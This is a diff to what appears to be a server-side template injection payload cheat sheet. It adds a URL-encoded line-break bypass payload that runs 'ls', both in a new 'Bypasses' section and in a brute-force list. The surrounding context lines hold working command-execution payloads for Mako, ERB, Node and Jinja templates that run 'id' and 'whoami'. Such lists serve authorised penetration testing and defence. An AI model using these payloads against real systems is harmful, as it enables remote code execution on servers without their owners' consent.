@@ -309,6 +309,13 @@ ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
+## Bypasses
+
+```bash
+#Line break URLencoded
+%7B%7B%0d%0a`ls`%7D%7D
+```
+
 ## Intruder Brute Force List
 
 ```csharp
@@ -469,6 +476,7 @@ body {color: `global.process.mainModule.require("child_process").execSync("id")`
 {{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 {{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
 {{self}}
+%7B%7B%0d%0a`ls`%7D%7D
 ```
 
 ## References
